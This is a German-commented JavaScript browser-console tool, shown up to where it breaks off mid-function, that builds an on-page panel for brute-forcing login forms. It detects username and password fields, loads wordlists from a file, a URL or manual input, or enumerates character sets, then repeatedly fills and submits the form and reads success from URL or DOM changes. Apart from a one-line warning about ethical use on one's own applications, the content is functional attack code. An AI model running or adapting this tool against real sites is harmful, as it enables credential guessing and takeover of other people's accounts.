// FormScanner.js - Kopiere diesen Code in die Browser-Konsole deiner eigenen Anwendung
// Warnung: Verwende dieses Tool nur für ethische Sicherheitstests auf eigenen Anwendungen!

(function () {
    // Haupt-Container für unser Tool erstellen
    const createToolContainer = () => {
        // Bestehender Code bleibt unverändert
        const container = document.createElement('div');
        container.id = 'security-test-tool';
        container.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      width: 400px;
      background-color: #2C2E3B;
      color: white;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      font-family: Arial, sans-serif;
      z-index: 9999;
      padding: 15px;
      max-height: 90vh;
      overflow-y: auto;
    `;

        // Header hinzufügen
        const header = document.createElement('div');
        header.innerHTML = `
      <h2 style="margin: 0 0 15px 0; font-size: 18px; display: flex; justify-content: space-between; align-items: center;">
        <span>Sicherheitstest-Tool</span>
        <button id="security-tool-toggle" style="background: none; border: none; color: white; cursor: pointer; font-size: 20px;">−</button>
      </h2>
    `;
        container.appendChild(header);

        // Content-Bereich hinzufügen
        const content = document.createElement('div');
        content.id = 'security-tool-content';
        container.appendChild(content);

        document.body.appendChild(container);

        // Toggle-Funktionalität
        document.getElementById('security-tool-toggle').addEventListener('click', function () {
            const content = document.getElementById('security-tool-content');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                this.textContent = '−';
            } else {
                content.style.display = 'none';
                this.textContent = '+';
            }
        });

        // Verschieben-Funktionalität
        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', function (e) {
            if (e.target.id === 'security-tool-toggle') return; // Nicht ziehen, wenn auf Toggle geklickt

            isDragging = true;
            const containerRect = container.getBoundingClientRect();
            offsetX = e.clientX - containerRect.left;
            offsetY = e.clientY - containerRect.top;

            container.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', function (e) {
            if (!isDragging) return;

            container.style.left = (e.clientX - offsetX) + 'px';
            container.style.top = (e.clientY - offsetY) + 'px';
        });

        document.addEventListener('mouseup', function () {
            isDragging = false;
            container.style.cursor = 'default';
        });

        return content;
    };

    // Entferne das Tool, falls es bereits existiert
    const existingTool = document.getElementById('security-test-tool');
    if (existingTool) {
        document.body.removeChild(existingTool);
    }

    // Tool-Container erstellen
    const contentArea = createToolContainer();

    // Scanner für Formularfelder (bestehender Code)
    const scanForFields = () => {
        // Alle Eingabefelder finden
        const allInputs = document.querySelectorAll('input, textarea, select');
        const formFields = [];

        // Felder nach Typen und Attributen analysieren
        allInputs.forEach(input => {
            const type = input.type || 'text';
            const id = input.id || '';
            const name = input.name || '';
            const placeholder = input.placeholder || '';
            const classes = Array.from(input.classList).join(' ');
            const isPassword = type === 'password';
            const isHidden = input.style.display === 'none' ||
                window.getComputedStyle(input).display === 'none' ||
                input.type === 'hidden';

            let fieldType = type;

            // Versuche, den Feldtyp intelligent zu erraten
            if (isPassword) {
                fieldType = 'password';
            } else if (name.toLowerCase().includes('user') ||
                id.toLowerCase().includes('user') ||
                placeholder.toLowerCase().includes('user') ||
                classes.toLowerCase().includes('user')) {
                fieldType = 'username';
            } else if (name.toLowerCase().includes('email') ||
                id.toLowerCase().includes('email') ||
                placeholder.toLowerCase().includes('email') ||
                classes.toLowerCase().includes('email')) {
                fieldType = 'email';
            }

            formFields.push({
                element: input,
                type: fieldType,
                id,
                name,
                placeholder,
                classes,
                isPassword,
                isHidden
            });
        });

        return formFields;
    };

    // Formulare scannen (bestehender Code)
    const scanForms = () => {
        const forms = document.querySelectorAll('form');
        const formList = [];

        forms.forEach((form, index) => {
            const id = form.id || `form-${index}`;
            const action = form.action || 'unknown';
            const method = form.method || 'GET';
            const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');

            formList.push({
                element: form,
                id,
                action,
                method,
                submitButton,
                fields: Array.from(form.querySelectorAll('input, textarea, select'))
            });
        });

        return formList;
    };

    // Hilfsfunktion zum Laden einer Datei von einer URL
    const loadFileFromUrl = async (url, progressCallback) => {
        try {
            // Stream-Verarbeitung für große Dateien
            const response = await fetch(url);

            if (!response.ok) {
                throw new Error(`HTTP-Fehler: ${response.status}`);
            }

            const contentLength = response.headers.get('Content-Length');
            const totalSize = contentLength ? parseInt(contentLength) : undefined;
            let loaded = 0;
            let text = '';

            // Reader für den Response-Body erstellen
            const reader = response.body.getReader();

            // Lese die Daten in Chunks
            while (true) {
                const {done, value} = await reader.read();

                if (done) break;

                // Chunk verarbeiten
                loaded += value.length;

                // Text zum Ergebnis hinzufügen
                const chunk = new TextDecoder().decode(value, {stream: true});
                text += chunk;

                // Fortschritt melden
                if (progressCallback && totalSize) {
                    const progress = Math.round((loaded / totalSize) * 100);
                    progressCallback(progress, loaded, totalSize);
                }
            }

            // Passwörter durch Zeilenumbrüche teilen
            const passwords = text.split(/\r?\n/).filter(line => line.trim() !== '');

            return {
                success: true,
                data: passwords,
                text: text,
                count: passwords.length
            };
        } catch (error) {
            console.error('Fehler beim Laden der URL:', error);
            return {
                success: false,
                error: error.message,
                data: [],
                count: 0
            };
        }
    };

    // UI erstellen
    const createUI = () => {
        const fields = scanForFields();
        const forms = scanForms();
        const passwordFields = fields.filter(f => f.isPassword);
        // Erweitere die Erkennung von Benutzernamefeldern
        const usernameFields = fields.filter(f =>
            f.type === 'username' ||
            f.type === 'email' ||
            f.type === 'text' || // Füge Textfelder hinzu, da viele Login-Formulare einfache text-Inputs für Benutzernamen verwenden
            (!f.isPassword && !f.isHidden && (
                f.id.toLowerCase().includes('user') ||
                f.id.toLowerCase().includes('email') ||
                f.id.toLowerCase().includes('login') ||
                f.name.toLowerCase().includes('user') ||
                f.name.toLowerCase().includes('email') ||
                f.name.toLowerCase().includes('login') ||
                f.placeholder.toLowerCase().includes('user') ||
                f.placeholder.toLowerCase().includes('email') ||
                f.placeholder.toLowerCase().includes('login')
            ))
        );

        // HTML für das Tool
        let html = `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Gefundene Formularfelder:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (fields.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">Keine Formularfelder gefunden.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            fields.forEach(field => {
                const hiddenText = field.isHidden ? ' (versteckt)' : '';
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${field.type}</span>: 
          ${field.id || field.name || 'unbenannt'}${hiddenText}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Formulare anzeigen
        html += `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Gefundene Formulare:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (forms.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">Keine Formulare gefunden.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            forms.forEach(form => {
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${form.id}</span>: 
          Method: ${form.method}, Fields: ${form.fields.length}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Brute-Force-Bereich nur anzeigen, wenn Passwort- und Benutzernamenfelder gefunden wurden
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            html += `
        <div style="margin-bottom: 15px;">
          <h3 style="margin: 0 0 8px 0; font-size: 16px;">Brute-Force-Test:</h3>
          <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Benutzernamenfeld:</label>
              <select id="username-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${usernameFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Feld ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Passwortfeld:</label>
              <select id="password-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${passwordFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Feld ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Benutzername:</label>
              <input type="text" id="bf-username" style="width: 100%; padding: 5px; border-radius: 4px;" 
                     placeholder="Zu testender Benutzername">
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Brute-Force-Methode:</label>
              <select id="bf-method" style="width: 100%; padding: 5px; border-radius: 4px;">
                <option value="list">Passwort-Liste verwenden</option>
                <option value="charset">Zeichensatz verwenden (alle Kombinationen)</option>
              </select>
            </div>
            
            <div id="password-list-section" style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Passwort-Quelle:</label>
              <div style="margin-bottom: 10px;">
                <select id="password-source" style="width: 100%; padding: 5px; border-radius: 4px;">
                  <option value="local">Lokale Datei</option>
                  <option value="url">URL (für große Dateien)</option>
                  <option value="manual">Manuell eingeben</option>
                </select>
              </div>
              
              <!-- Lokale Datei Option -->
              <div id="local-file-section">
                <div style="display: flex; margin-bottom: 5px;">
                  <input type="file" id="password-file" accept=".txt" style="flex-grow: 1;">
                  <button id="load-password-file" style="background-color: #4a6ed3; color: white; border: none; border-radius: 4px; padding: 0 10px; cursor: pointer; margin-left: 5px;">Laden</button>
                </div>
                <div id="file-info" style="font-size: 12px; margin-bottom: 5px; color: #aaa; display: none;">
                  Datei geladen: <span id="file-name"></span> (<span id="password-count">0</span> Passwörter)
                </div>
              </div>
              
              <!-- URL Option (NEU) -->
              <div id="url-file-section" style="display: none;">
                <div style="margin-bottom: 5px;">
                  <input type="text" id="password-url" style="width: 75%; padding: 5px; border-radius: 4px;" 
                         placeholder="https://beispiel.com/wordlist.txt">
                  <button id="load-url-file" style="background-color: #4a6ed3; color: white; border: none; border-radius: 4px; padding: 5px 10px; cursor: pointer; margin-left: 5px;">Laden</button>
                </div>
                <div id="url-loading-progress" style="display: none; margin-bottom: 5px;">
                  <div style="height: 4px; width: 100%; background-color: #222; border-radius: 2px; overflow: hidden;">
                    <div id="url-progress-bar" style="height: 100%; width: 0; background-color: #4a6ed3;"></div>
                  </div>
                  <div style="font-size: 11px; margin-top: 3px; display: flex; justify-content: space-between;">
                    <span id="url-progress-text">0%</span>
                    <span id="url-loaded-bytes">0 KB / ? KB</span>
                  </div>
                </div>
                <div id="url-file-info" style="font-size: 12px; margin-bottom: 5px; color: #aaa; display: none;">
                  URL geladen: <span id="url-file-name"></span> (<span id="url-password-count">0</span> Passwörter)
                </div>
              </div>
              
              <!-- Manuelle Eingabe -->
              <div id="manual-entry-section" style="display: none;">
                <textarea id="bf-password-list" style="width: 100%; height: 80px; padding: 5px; border-radius: 4px;" 
                        placeholder="Ein Passwort pro Zeile"></textarea>
              </div>
            </div>
            
            <div id="charset-section" style="margin-bottom: 10px; display: none;">
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Zeichensatz:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 5px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-lowercase" checked> a-z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-uppercase"> A-Z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-numbers"> 0-9
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-special"> !@#$%^&*
                  </label>
                </div>
                <input type="text" id="charset-custom" style="width: 100%; padding: 5px; border-radius: 4px;" 
                       placeholder="Benutzerdefinierter Zeichensatz (optional)">
              </div>
              
              <div style="display: flex; gap: 10px; margin-bottom: 5px;">
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Min. Länge:</label>
                  <input type="number" id="min-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="1" min="1" max="8">
                </div>
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Max. Länge:</label>
                  <input type="number" id="max-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="3" min="1" max="8">
                </div>
              </div>
              
              <div style="background-color: #2c2e3b; padding: 5px; border-radius: 4px; font-size: 12px; margin-bottom: 5px;">
                <strong>Warnung:</strong> Große Zeichensätze und Längen > 4 können sehr langsam sein und den Browser einfrieren.
              </div>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Verzögerung zwischen Versuchen (ms):</label>
              <input type="number" id="bf-delay" style="width: 100%; padding: 5px; border-radius: 4px;" value="10">
            </div>
            
            <div style="display: flex; gap: 10px;">
              <button id="start-bf-button" style="flex-grow: 1; padding: 8px; background-color: #4a6ed3; color: white; 
                     border: none; border-radius: 4px; cursor: pointer;">Start</button>
              <button id="stop-bf-button" style="flex-grow: 1; padding: 8px; background-color: #d34a4a; color: white; 
                     border: none; border-radius: 4px; cursor: pointer; display: none;">Stop</button>
            </div>
            
            <div id="bf-status" style="margin-top: 10px; padding: 8px; background-color: #2C2E3B; border-radius: 4px;">
              Bereit...
            </div>
            
            <div id="info-line" style="margin-top: 10px; padding: 8px; background-color: #252733; border-radius: 4px; font-size: 13px; display: none;">
              <div>Letzter Versuch: <span id="last-attempt">-</span></div>
              <div>Status: <span id="last-attempt-status">-</span></div>
            </div>
          </div>
        </div>
      `;
        }

        contentArea.innerHTML = html;

        // Event-Listener hinzufügen, wenn Passwort- und Benutzernamenfelder gefunden wurden
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            let running = false;
            let stopRequested = false;
            let passwords = []; // Globale Variable für alle Passwörter

            // Toggle zwischen den Passwort-Quellen
            document.getElementById('password-source').addEventListener('change', function () {
                const source = this.value;
                document.getElementById('local-file-section').style.display = source === 'local' ? 'block' : 'none';
                document.getElementById('url-file-section').style.display = source === 'url' ? 'block' : 'none';
                document.getElementById('manual-entry-section').style.display = source === 'manual' ? 'block' : 'none';
            });

            // Datei-Upload-Funktionalität
            document.getElementById('load-password-file').addEventListener('click', function () {
                const fileInput = document.getElementById('password-file');
                const file = fileInput.files[0];

                if (!file) {
                    updateStatus('Fehler: Keine Datei ausgewählt!', true);
                    return;
                }

                const reader = new FileReader();

                reader.onload = function (e) {
                    const content = e.target.result;
                    passwords = content.split(/\r?\n/).filter(line => line.trim() !== '');

                    document.getElementById('file-info').style.display = 'block';
                    document.getElementById('file-name').textContent = file.name;
                    document.getElementById('password-count').textContent = passwords.length;

                    updateStatus(`Passwort-Liste geladen: ${passwords.length} Passwörter aus ${file.name}`, false);
                };

                reader.onerror = function () {
                    updateStatus('Fehler beim Lesen der Datei!', true);
                };

                reader.readAsText(file);
            });

            // URL-Lade-Funktionalität (NEU)
            document.getElementById('load-url-file').addEventListener('click', async function () {
                const urlInput = document.getElementById('password-url');
                const url = urlInput.value.trim();

                if (!url) {
                    updateStatus('Fehler: Keine URL eingegeben!', true);
                    return;
                }

                // UI für den Ladevorgang vorbereiten
                document.getElementById('url-loading-progress').style.display = 'block';
                document.getElementById('url-progress-bar').style.width = '0%';
                document.getElementById('url-progress-text').textContent = '0%';
                document.getElementById('url-loaded-bytes').textContent = '0 KB / ? KB';
                document.getElementById('url-file-info').style.display = 'none';
                document.getElementById('load-url-file').disabled = true;

                updateStatus('Lade Passwort-Liste von URL...', false);

                try {
                    // Fortschritts-Callback-Funktion
                    const updateProgress = (progress, loaded, total) => {
                        document.getElementById('url-progress-bar').style.width = `${progress}%`;
                        document.getElementById('url-progress-text').textContent = `${progress}%`;

                        const loadedKB = Math.round(loaded / 1024);
                        const totalKB = total ? Math.round(total / 1024) : '?';
                        document.getElementById('url-loaded-bytes').textContent = `${loadedKB} KB / ${totalKB} KB`;
                    };

                    // Datei von URL laden
                    const result = await loadFileFromUrl(url, updateProgress);

                    if (result.success) {
                        passwords = result.data;

                        document.getElementById('url-file-info').style.display = 'block';
                        document.getElementById('url-file-name').textContent = url.split('/').pop() || url;
                        document.getElementById('url-password-count').textContent = passwords.length;

                        updateStatus(`Passwort-Liste von URL geladen: ${passwords.length} Passwörter`, false);
                    } else {
                        updateStatus(`Fehler beim Laden der URL: ${result.error}`, true);
                    }
                } catch (error) {
                    updateStatus(`Fehler: ${error.message}`, true);
                } finally {
                    document.getElementById('load-url-file').disabled = false;
                }
            });

            // Toggle zwischen Passwort-Liste und Zeichensatz-Methode
            document.getElementById('bf-method').addEventListener('change', function () {
                const method = this.value;
                document.getElementById('password-list-section').style.display = method === 'list' ? 'block' : 'none';
                document.getElementById('charset-section').style.display = method === 'charset' ? 'block' : 'none';
            });

            // Hilfsfunktion zur Generierung von Passwörtern basierend auf Zeichensatz
            const generatePasswordsFromCharset = (charset, minLength, maxLength) => {
                const passwords = [];

                // Rekursive Funktion zur Generierung aller Kombinationen
                const generateCombinations = (currentPassword, length) => {
                    if (length === 0) {
                        passwords.push(currentPassword);
                        return;
                    }

                    for (let i = 0; i < charset.length; i++) {
                        generateCombinations(currentPassword + charset[i], length - 1);
                    }
                };

                // Generiere für jede Länge zwischen min und max
                for (let length = minLength; length <= maxLength; length++) {
                    generateCombinations('', length);
                }

                return passwords;
            };

            // Hilfsfunktion zur Generierung eines Zeichensatzes basierend auf Benutzerauswahl
            const buildCharset = () => {
                let charset = '';

                if (document.getElementById('charset-lowercase').checked) {
                    charset += 'abcdefghijklmnopqrstuvwxyz';
                }

                if (document.getElementById('charset-uppercase').checked) {
                    charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                }

                if (document.getElementById('charset-numbers').checked) {
                    charset += '0123456789';
                }

                if (document.getElementById('charset-special').checked) {
                    charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
                }

                const customCharset = document.getElementById('charset-custom').value.trim();
                if (customCharset) {
                    // Deduplizieren des Zeichensatzes
                    for (let i = 0; i < customCharset.length; i++) {
                        if (charset.indexOf(customCharset[i]) === -1) {
                            charset += customCharset[i];
                        }
                    }
                }

                return charset;
            };

            // Generator für inkrementelle Passwörter (für effizienteres Brute-Forcing)
            const createPasswordGenerator = (charset, minLength, maxLength) => {
                let currentLength = minLength;
                let indices = Array(minLength).fill(0);

                return {
                    next: function () {
                        if (currentLength > maxLength) {
                            return {done: true, value: null};
                        }

                        // Erzeuge aktuelles Passwort
                        let password = '';
                        for (let i = 0; i < indices.length; i++) {
                            password += charset[indices[i]];
                        }

                        // Erhöhe Indizes für nächstes Passwort
                        let pos = indices.length - 1;
                        while (pos >= 0) {
                            indices[pos]++;
                            if (indices[pos] < charset.length) {
                                break;
                            }
                            indices[pos] = 0;
                            pos--;
                        }

                        // Wenn wir alle Kombinationen für die aktuelle Länge durchlaufen haben
                        if (pos < 0) {
                            currentLength++;
                            if (currentLength <= maxLength) {
                                indices = Array(currentLength).fill(0);
                            }
                        }

                        return {done: false, value: password};
                    }
                };
            };

            // Hilfsfunktion zum Aktualisieren der Infozeile
            const updateInfoLine = (username, password, status) => {
                const infoLine = document.getElementById('info-line');
                const lastAttempt = document.getElementById('last-attempt');
                const lastAttemptStatus = document.getElementById('last-attempt-status');

                infoLine.style.display = 'block';
                lastAttempt.textContent = `${username} / ${password}`;
                lastAttemptStatus.textContent = status;

                // Setze Farbe basierend auf Status
                if (status.includes('Erfolg')) {
                    lastAttemptStatus.style.color = '#4CAF50';
                    infoLine.style.backgroundColor = '#1e3323';
                } else if (status.includes('Fehlgeschlagen')) {
                    lastAttemptStatus.style.color = '#FF5252';
                } else {
                    lastAttemptStatus.style.color = '#FFC107';
                }
            };

            // Hilfsfunktion zum Prüfen auf Erfolg/Fehlschlag
            const checkLoginStatus = () => {
                // Spezifisch für die Waiworinao-Anwendung
                const messageElement = document.getElementById('message');
                if (messageElement) {
                    // Prüfe auf Erfolgs- oder Fehlermeldung
                    if (messageElement.classList.contains('success')) {
                        return 'success';
                    } else if (messageElement.classList.contains('error')) {
                        return 'error';
                    }
                }

                // Allgemeine Prüfungen
                // Suche nach Elementen mit success/error Klassen oder typischen Meldungstexten
                const successIndicators = [
                    '.success', '.alert-success', '[class*="success"]',
                    '.message.success', '[data-success]'
                ];

                const errorIndicators = [
                    '.error', '.alert-danger', '.alert-error', '[class*="error"]',
                    '.message.error', '[data-error]'
                ];

                for (const selector of successIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Prüfe, ob das Element sichtbar ist
                            return 'success';
                        }
                    }
                }

                for (const selector of errorIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Prüfe, ob das Element sichtbar ist
                            return 'error';
                        }
                    }
                }

                // Suche nach Texten in der Seite, die auf Erfolg/Fehler hindeuten
                const bodyText = document.body.innerText.toLowerCase();
                if (bodyText.includes('login erfolgreich') ||
                    bodyText.includes('anmeldung erfolgreich') ||
                    bodyText.includes('willkommen zurück')) {
                    return 'success';
                }

                if (bodyText.includes('ungültiger benutzername') ||
                    bodyText.includes('falsches passwort') ||
                    bodyText.includes('login fehlgeschlagen')) {
                    return 'error';
                }

                return 'unknown';
            };

            document.getElementById('start-bf-button').addEventListener('click', async function () {
                if (running) return;

                const usernameFieldIdx = parseInt(document.getElementById('username-field-select').value);
                const passwordFieldIdx = parseInt(document.getElementById('password-field-select').value);
                const username = document.getElementById('bf-username').value.trim();
                const delay = parseInt(document.getElementById('bf-delay').value);
                const method = document.getElementById('bf-method').value;
                const passwordSource = document.getElementById('password-source').value;

                if (!username) {
                    updateStatus('Fehler: Bitte Benutzernamen eingeben!', true);
                    return;
                }

                let passwordGenerator;
                let totalPasswords = 0;

                if (method === 'list') {
                    // Je nach Quelle Passwörter bekommen
                    if (passwordSource === 'manual') {
                        const passwordListText = document.getElementById('bf-password-list').value.trim();

                        if (!passwordListText) {
                            updateStatus('Fehler: Bitte Passwort-Liste eingeben!', true);
                            return;
                        }

                        passwords = passwordListText.split('\n').map(p => p.trim()).filter(p => p);
                    }

                    if (passwords.length === 0) {
                        updateStatus('Fehler: Keine gültigen Passwörter verfügbar!', true);
                        return;
                    }

                    let currentIndex = 0;
                    passwordGenerator = {
                        next: function () {
                            if (currentIndex >= passwords.length) {
                                return {done: true, value: null};
                            }
                            return {done: false, value: passwords[currentIndex++]};
                        }
                    };

                    totalPasswords = passwords.length;
                } else {
                    // Zeichensatz verwenden
                    const charset = buildCharset();
                    const minLength = parseInt(document.getElementById('min-length').value);
                    const maxLength = parseInt(document.getElementById('max-length').value);

                    if (charset.length === 0) {
                        updateStatus('Fehler: Bitte einen Zeichensatz auswählen!', true);
                        return;
                    }

                    if (minLength > maxLength) {
                        updateStatus('Fehler: Minimale Länge kann nicht größer als maximale Länge sein!', true);
                        return;
                    }

                    if (maxLength > 8) {
                        updateStatus('Fehler: Maximale Länge darf nicht größer als 8 sein (Browser-Limitierung)!', true);
                        return;
                    }

                    // Berechnung der Gesamtzahl möglicher Passwörter
                    let count = 0;
                    for (let len = minLength; len <= maxLength; len++) {
                        count += Math.pow(charset.length, len);
                    }

                    if (count > 100000) {
                        const confirmed = confirm(`Warnung: Es werden ${count.toLocaleString()} mögliche Passwörter generiert. Dies kann lange dauern und den Browser einfrieren. Fortfahren?`);
                        if (!confirmed) {
                            updateStatus('Brute-Force abgebrochen.', false);
                            return;
                        }
                    }

                    passwordGenerator = createPasswordGenerator(charset, minLength, maxLength);
                    totalPasswords = count;
                }

                running = true;
                stopRequested = false;
                document.getElementById('start-bf-button').style.display = 'none';
                document.getElementById('stop-bf-button').style.display = 'block';

                const usernameField = usernameFields[usernameFieldIdx].element;
                const passwordField = passwordFields[passwordFieldIdx].element;

                updateStatus(`Brute-Force gestartet. Bis zu ${totalPasswords.toLocaleString()} Passwörter zu testen...`);

                // Form finden, zu der die Felder gehören
                let form = null;
                for (let f of forms) {
                    if (f.fields.includes(usernameField) || f.fields.includes(passwordField)) {
                        form = f.element;
                        break;
                    }
                }

                let count = 0;
                let result;
                let successfulPassword = null;
                let initialURL = window.location.href;

                // Für jedes Passwort:
                while (!(result = passwordGenerator.next()).done) {
                    count++;

                    if (stopRequested) {
                        updateStatus('Brute-Force gestoppt.', false);
                        break;
                    }

                    const password = result.value;

                    // Bei jedem Versuch die Statusanzeige aktualisieren
                    updateStatus(`Test ${count.toLocaleString()}/${totalPasswords.toLocaleString()}: ${username} / ${password}`);

                    // Felder ausfüllen
                    usernameField.value = username;
                    passwordField.value = password;

                    // Felder-Events auslösen (wichtig für viele moderne JS-Frameworks)
                    triggerInputEvents(usernameField);
                    triggerInputEvents(passwordField);

                    // Wenn ein Formular existiert, versuche eine Submission
                    if (form) {
                        // Speichere die aktuelle URL
                        const startUrl = window.location.href;

                        // Prüfe vorher, ob ein Submit-Button existiert
                        const submitButton = form.querySelector('button[type="submit"], input[type="submit"], button:not([type]), [role="button"]');

                        // Prüfe, ob ein onsubmit-Handler existiert
                        const hasOnSubmitHandler = form.onsubmit !== null;

                        // Versuche den Submit-Button zu klicken oder das Formular zu submitten
                        if (submitButton) {
                            submitButton.click();
                        } else if (!hasOnSubmitHandler) {
                            try {
                                // Versuche ein Event auszulösen, wenn kein Submit-Button existiert
                                const submitEvent = new Event('submit', {
                                    bubbles: true,
                                    cancelable: true
                                });
                                form.dispatchEvent(submitEvent);
                            } catch (e) {
                                console.error('Fehler beim Auslösen des Submit-Events:', e);
                            }
                        }

                        // Warte und prüfe dann auf Erfolg/Fehler
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Prüfe auf URL-Änderung
                        if (window.location.href !== startUrl) {
                            // URL hat sich geändert - wahrscheinlich erfolgreicher Login
                            successfulPassword = password;
                            updateInfoLine(username, password, 'Erfolg (URL-Änderung)');
                            showSuccessMessage(username, successfulPassword);
                            break;
                        }

                        // Prüfe auf Login-Status über DOM-Änderungen
                        const loginStatus = checkLoginStatus();

                        // Informationszeile aktualisieren
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Erfolg! Korrektes Passwort gefunden');
                            successfulPassword = password;
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Fehlgeschlagen');
                        } else {
                            updateInfoLine(username, password, 'Unsicher (keine eindeutige Rückmeldung)');
                        }

                        // Prüfe auch auf Elemente, die in der Waiworinao-Demo angezeigt werden
                        const attemptUsernameEl = document.getElementById('attempt-username');
                        const attemptPasswordEl = document.getElementById('attempt-password');
                        if (attemptUsernameEl && attemptPasswordEl) {
                            if (attemptUsernameEl.textContent === username && attemptPasswordEl.textContent === password) {
                                // Login-Versuch wurde registriert, prüfe auf Erfolg/Fehler
                                const messageEl = document.getElementById('message');
                                if (messageEl && messageEl.classList.contains('success')) {
                                    updateInfoLine(username, password, 'Erfolg! Korrektes Passwort gefunden');
                                    successfulPassword = password;
                                    showSuccessMessage(username, successfulPassword);
                                    break;
                                }
                            }
                        }
                    } else {
                        // Wenn kein Formular gefunden wurde, warte einfach
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Prüfe, ob die URL sich geändert hat (erfolgreicher Login)
                        if (window.location.href !== initialURL) {
                            successfulPassword = password;
                            updateInfoLine(username, password, 'Erfolg (URL-Änderung)');
                            showSuccessMessage(username, successfulPassword);
                            break;
                        }

                        // Prüfe auf Login-Status über DOM-Änderungen
                        const loginStatus = checkLoginStatus();
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Erfolg! Korrektes Passwort gefunden');
                            successfulPassword = password;
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Fehlgeschlagen');
                        } else {
                            updateInfoLine(username, password, 'Unsicher (keine eindeutige Rückmeldung)');
                        }
                    }
                }

                running = false;
                document.getElementById('start-bf-button').style.display = 'block';
                document.getElementById('stop-bf-button').style.display = 'none';

                if (!stopRequested && !successfulPassword) {
                    updateStatus('Brute-Force-Test abgeschlossen. Kein erfolgreiches Passwort gefunden.', false);
                }
            });

            document.getElementById('stop-bf-button').addEventListener('click', function () {
                stopRequested = true;
                updateStatus('Stoppe Brute-Force-Test...', false);
            });
        }
    };

    // Hilfsfunktion zum Auslösen von Input-Events (wichtig für JS-Frameworks)
    const triggerInputEvents = (element) => {
        // Focus
        element.focus();

        // Input event
        const inputEvent = new Event('input', {bubbles: true});
        element.dispatchEvent(inputEvent);

        // Change event
        const changeEvent = new Event('change', {bubbles: true});
        element.dispatchEvent(changeEvent);

        // Keydown/keyup events for extra measure
        const keydownEvent = new KeyboardEvent('keydown', {bubbles: true});
        element.dispatchEvent(keydownEvent);

        const keyupEvent = new KeyboardEvent('keyup', {bubbles: true});
        element.dispatchEvent(keyupEvent);
    };

    // Status aktualisieren
    const updateStatus = (message, isError = false) => {
        const statusElement = document.getElementById('bf-status');
        if (statusElement) {
            statusElement.textContent = message;
            statusElement.style.backgroundColor = isError ? '#6b2b2b' : '#2C2E3B';
        }
    };

    // Erfolgreiche Passwörter anzeigen
    const showSuccessMessage = (username, password) => {
        // Erstelle oder aktualisiere das Erfolg-Element
        let successElement = document.getElementById('success-message');
        if (!successElement) {
            successElement = document.createElement('div');
            successElement.id = 'success-message';
            successElement.style.cssText = `
        margin-top: 15px;
        padding: 10px;
        background-color: #2e5b2e;
        border-radius: 5px;
        color: white;
        font-weight: bold;
      `;
            document.getElementById('security-tool-content').appendChild(successElement);
        }

        // Aktualisiere den Inhalt
        successElement.innerHTML = `
      <div style="font-size: 16px; margin-bottom: 5px;">✅ Erfolgreiches Login gefunden!</div>
      <div style="margin-bottom: 5px;">Benutzername: <span style="font-family: monospace;">${username}</span></div>
      <div style="margin-bottom: 5px;">Passwort: <span style="font-family: monospace;">${password}</span></div>
